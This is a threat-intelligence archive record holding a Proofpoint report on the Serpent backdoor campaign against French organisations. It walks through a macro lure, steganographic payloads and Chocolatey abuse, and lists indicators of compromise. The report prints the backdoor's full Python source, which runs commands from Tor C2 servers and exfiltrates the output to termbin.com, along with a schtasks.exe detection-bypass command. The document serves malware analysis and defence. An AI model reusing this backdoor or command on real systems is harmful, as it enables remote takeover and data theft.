{
    "id": "2caa060a-132a-441c-804b-6cf79fbc239b",
    "created_at": "2022-10-25T16:48:21.884003Z",
    "updated_at": "2025-03-27T02:05:31.667295Z",
    "deleted_at": null,
    "sha1_hash": "6fa14891cb1ded25243eedebcf706769b9db24d1",
    "title": "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
    "authors": "Proofpoint",
    "file_creation_date": "2022-03-22T00:48:44Z",
    "file_modification_date": "2022-03-22T00:48:44Z",
    "file_size": 2439008,
    "plain_text": "# Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain\n\n**[proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain](https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain)**\n\nMarch 18, 2022\n\n## Key Findings\n\nProofpoint identified a targeted attack leveraging an open-source package installer\nChocolatey to deliver a backdoor.\nThe attack targeted French entities in the construction, real estate, and government\nindustries.\nThe attacker used a resume themed subject and lure purporting to be GDPR\ninformation.\nThe attacker used steganography, including a cartoon image, to download and install the\nSerpent backdoor.\nThe attacker also demonstrated a novel detection bypass technique using a Scheduled\nTask.\nObjectives are currently unknown however based on the tactics and targeting observed it\nis likely an advanced, targeted threat.\n\n## Overview\n\nProofpoint observed new, targeted activity impacting French entities in the construction and\ngovernment sectors. The threat actor used macro-enabled Microsoft Word documents to\ndistribute the Chocolatey installer package, an open-source package installer. Various parts of\nthe VBA macro include the following ASCII art and depict a snake as below.\n\nThe threat actor attempted to install a backdoor on a potential victim’s device, which could\nenable remote administration, command and control (C2), data theft, or deliver other\nadditional payloads Proofpoint refers to this backdoor as Serpent The ultimate objective of\n\n\n-----\n\nthe threat actor is currently unknown.\n\n## Campaign Details\n\nIn the observed campaign, messages are in French and purport to be, for example:\n\nFrom: \"Jeanne\" <jeanne.vrakele@gmail[.]com>\n\nSubject \"Candidature - Jeanne Vrakele\"\n\nThe messages contain a macro-enabled Microsoft Word document masquerading as\ninformation relating to the “règlement général sur la protection des données (RGPD)” or the\nEuropean Union’s General Data Protection Regulations (GDPR).\n\n_Figure 1: GDPR themed lure._\n\nWhen macros are enabled, the document executes that macro, which reaches out to an image\nURL, e.g., https://www.fhccu[.]com/images/ship3[.]jpg, containing a base64 encoded\nPowerShell script hidden in the image using steganography. The PowerShell script first\n[downloads, installs, and updates the Chocolatey installer package and repository script.](https://chocolatey.org/install.ps1)\nChocolatey is a software management automation tool for Windows that wraps installers,\nexecutables, zips, and scripts into compiled packages, similar to Homebrew for OSX. The\nsoftware provides both open-source and paid versions with various levels of functionality.\nProofpoint has not previously observed a threat actor use Chocolatey in campaigns.\n\n\n-----\n\n[The script then uses Chocolatey to install Python, including the pip Python package installer,](https://pypi.org/project/pip/)\n[which it then uses to install various dependencies including PySocks, a Python based reverse](https://pypi.org/project/PySocks/)\nproxy client that enables users to send traffic through SOCKS and HTTP proxy servers.\n\nNext, the script fetches another image file, e.g. https://www.fhccu[.]com/images/7[.]jpg,\nwhich contains a base64 encoded Python script also hidden using steganography, and saves\nthe Python script as MicrosoftSecurityUpdate.py. The script then creates and executes a .bat\nfile that in turn executes the Python script.\n\nThe attack chain ends with a command to a shortened URL which redirects to the Microsoft\nOffice help website.\n\n_Figure 2: “Swiper” image with base64 encoded PowerShell script to download and install_\n_Chocolatey and Python and fetch another steganographic image._\n\nThe Python script (the Serpent backdoor) is as follows:\n\n\n-----\n\n#!/usr/bin/python3\n\nfrom subprocess import Popen, PIPE, STDOUT\nimport requests\nimport re\nimport socket\nimport time\n\ncmd_url_order =\n'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html'\ncmd_url_answer =\n'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'\nhostname = socket.gethostname()\nhostname_pattern = 'host:%s-00' % hostname\nheaders = {}\nreferer = {'Referer': hostname_pattern}\ncache_control = {'Cache-Control': 'no-cache'}\nheaders.update(referer)\nheaders.update(cache_control)\ncheck_cmd_1 = ''\n\ndef recvall(sock, n):\ndata = b''\nwhile len(data) < n:\npacket = sock.recv(n - len(data))\nif not packet:\nreturn None\ndata += packet\nreturn data\n\ndef get_cmd():\nreq = requests.get(cmd_url_order, headers=headers).content.decode().strip()\nif req == '':\npass\nelse:\nreturn req\n\ndef run_cmd(cmd):\ncmd_split = cmd.split('--')\nif cmd_split[1] == hostname:\ncmd = cmd_split[2]\nprint(cmd)\nrun = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()\nout = run.stdout.read()\n\n\n-----\n\nif not out:\nout = b'ok'\ntermbin_cnx = socks.socksocket()\ntermbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsocks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)\ntermbin_cnx.connect(('termbin.com', 9999))\ntermbin_cnx.send(out)\nrecv = termbin_cnx.recv(100000)\ntermbin_url_created = recv.decode().rstrip('\\x00').strip()\nprint(termbin_url_created)\ntermbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}\nheaders.update(termbin_header)\ntry:\npush = requests.get(cmd_url_answer, headers=headers)\nprint('executed')\nheaders.update(referer)\nexcept Exception as e:\nprint(e)\npass\nelse:\nprint('not for me')\n\nwhile True:\ntime.sleep(10)\ntry:\ncheck_cmd = get_cmd()\nif check_cmd != check_cmd_1:\ntime.sleep(20)\nprint(check_cmd)\nrun_cmd(check_cmd)\ncheck_cmd_1 = check_cmd\npass\nexcept Exception as e:\nprint(e)\npass\n\nThis Serpent backdoor periodically pings the “order” server (the first onion[.]pet URL) and\nexpects responses of the form <random integer>--<hostname>--<command>. If <hostname>\nmatches the hostname of the infected computer, the infected host runs the command provided\nby the order server (<command>), which could be any Windows command as designated by\nthe attacker, and records the output. The malware then uses PySocks to connect to the\ncommand line pastebin tool Termbin, pastes the output to a bin, and receives the bin’s unique\nURL. Finally, the malware sends a request to the “answer” server (the second onion[.]pet\n\n\n-----\n\nURL), including the hostname and bin URL in the header. This allows the attacker to monitor\nthe bin outputs via the “answer” URL and see what the infected host’s response was. The\nmalware cycles through this process indefinitely.\n\n_Figure 3: Serpent backdoor attack chain._\n\nBoth steganographic images are hosted on what appears to be a Jamaican credit union\nwebsite.\n\n\n-----\n\n_Figure 4: Image with base64 encoded Python script._\n\nThe threat actor uses a Tor proxy for command and control (C2) infrastructure, for example:\n\nhttp://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion[.]pet/index.html\n\n## Additional Tooling\n\nIn addition to the images used in this attack chain Proofpoint researchers have observed and\nidentified additional payloads being served from the same host. One of particular interest is\nutilizing what Proofpoint believes to be a novel application of signed binary proxy execution\nusing schtasks.exe. Notably, this is an attempt to bypass detection by defensive measures.\n\nThis command is contained within a similar Swiper image called ship.jpg after the end of file\nmarker.\n\nschtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN\nrun /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO\nDummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f\n\nThe above command leverages schtasks.exe to create a one-time task to call a portable\nexecutable. In this case the executable is called calc.exe. The trigger for this task is contingent\non the creation of a Windows event with EventID of 777. The command then creates a dummy\nevent to trigger the task and deletes the task from the task scheduler. This peculiar application\nof tasking logic results in the portable executable being executed as a child process of\ntaskhostsw.exe which is a signed Windows binary.\n\n## Threat Assessment\n\n\n-----\n\nThe threat actor leveraged multiple unique behaviors and targeting suggesting this is likely an\nadvanced, targeted threat.\n\nLeveraging Chocolatey as an initial payload may allow the threat actor to bypass threat\ndetection mechanisms because it is a legitimate software package and would not immediately\nbe identified as malicious. The follow-on use of legitimate Python tools observed in network\ntraffic may also not be flagged or identified as malicious. The use of steganography in the\nmacro and follow-on payloads is unique; Proofpoint rarely observes the use of steganography\nin campaigns. Additionally, the technique using schtasks.exe to execute any desired portable\nexecutable file is also unique and previously unobserved by Proofpoint threat researchers.\n\nProofpoint does not associate this threat with a known actor or group.\n\nThe ultimate objectives of the threat actor are presently unknown. Successful compromise\nwould enable a threat actor to conduct a variety of activities, including stealing information,\nobtaining control of an infected host, or installing additional payloads.\n\n## A Note on Highly Targeted Threats\n\nProofpoint has a vast amount of organic threat data to pour over every day. This presents\nunique challenges when trying to surface interesting threats. The aforementioned campaign\nand the threats contained within were surfaced using Proofpoint’s machine learning-enabled\nCampaign Discovery tool. This tool uses a custom-built deep neural network model to\ngenerate useful numeric “encodings” of threats based on their behavioral forensics. These\nencodings are then used to generate clusters of similar threats. This allows Proofpoint’s threat\nresearchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of\ncompromise that define them more easily. By clustering together threats that are alike, the\ntool also facilitates the discovery of anomalous or unusual threats that are not similar to any\nother observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii\nart like all sweet tools should.\n\n\n-----\n\n**Indicators of Compromise**\n\n**Indicator** **Description**\n\nhttps://www[.]fhccu[.]com/images/ship3[.]jpg Encoded\nPayload\nURL\n\nhttps://www[.]fhccu[.]com/images/7[.]jpg Encoded\nPayload\nURL\n\n\nhttp://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid\n\n[.]onion[.]pet/index[.]html\n\n\nC2\n\n\n-----\n\nhttp://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd\n\n[.]onion[.]pet/index[.]html\n\n\nC2\n\n\nhttp://shorturl[.]at/qzES8 ShortURL\n\njeanne.vrakele@gmail[.]com Sender\nEmail\n\njean.dupontel@protonmail[.]com Sender\nEmail\n\nno-reply@dgfip-nanterre[.]com Sender\nEmail\n\nf988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2 Docm\nSHA256\n\nec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab Docm\nSHA256\n\n8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19 Docm\nSHA256\n\nProofpoint detects and blocks all documents associated with the campaigns and has published\nthe following Emerging Threat signatures:\n\n2035303 - ET INFO Observed Chocolatey Windows Package Management Domain\n(chocolatey .org in TLS SNI)\n\n2035306 - ET INFO Chocolatey Windows Package Management Installation File Retrieval\n\n2851286 - ETPRO MALWARE Malicious Script Retrieved via Image Request\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/kmcy16dup3hdx3dzpbay2vd240j9ffs0"
    ],
    "report_names": [
        "Proofpoint_Serpent-Backdoor-Targets-French-Entities(03-21-2022)"
    ],
    "threat_actors": [
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041131,
    "ts_creation_date": 1647910124,
    "ts_modification_date": 1647910124,
    "files": {
        "pdf": "https://archive.orkl.eu/6fa14891cb1ded25243eedebcf706769b9db24d1.pdf",
        "text": "https://archive.orkl.eu/6fa14891cb1ded25243eedebcf706769b9db24d1.txt",
        "img": "https://archive.orkl.eu/6fa14891cb1ded25243eedebcf706769b9db24d1.jpg"
    }
}